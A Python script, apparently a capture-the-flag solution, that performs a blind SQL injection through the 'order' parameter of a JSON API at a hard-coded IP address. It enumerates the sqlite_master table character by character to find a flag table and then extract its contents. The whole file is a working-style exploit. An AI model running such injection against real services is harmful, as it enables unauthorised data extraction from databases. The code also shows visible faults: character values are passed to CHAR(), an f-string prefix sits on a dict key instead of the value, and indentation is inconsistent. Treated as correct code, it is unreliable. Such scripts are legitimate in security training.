import requests
import string
import json

URL = "http://188.166.145.178:32715/api/list"
CHARS = string.printable


def get_response(payload):
    r = requests.post(URL, data=json.dumps(payload))
    return json.loads(r.text)


def ordered_by_id(response):
    return response[0].get('id') == 1


def get_flag_table_name():
    flag_table = "flag_"
    for i in range(5,16):
        for c in CHARS:
            payload = {
                    "order":f"(CASE WHEN (SELECT SUBSTR(name,{i},1) FROM sqlite_master WHERE tbl_name LIKE 'flag%')=CHAR({c}) THEN id ELSE count END)"
                    }
            if ordered_by_id(get_response(payload)):
                flag_table += c
                break

    return flag_table


def get_flag():
    flag = ""
    success = False
    flag_table = get_flag_table_name()

    i = 0
    while not success:
        for c in CHARS:
             payload = {
                     f"order":"(CASE WHEN (SELECT SUBSTR(flag,{i},1) FROM {flag_table})=CHAR({c}) THEN id ELSE count END)"
                     }

            if ordered_by_id(get_response(payload)):
                flag += c
                if c == '}':
                    success = True
                    break
        i += 1
    return flag


if __name__ == "__main__":
    print(get_flag())



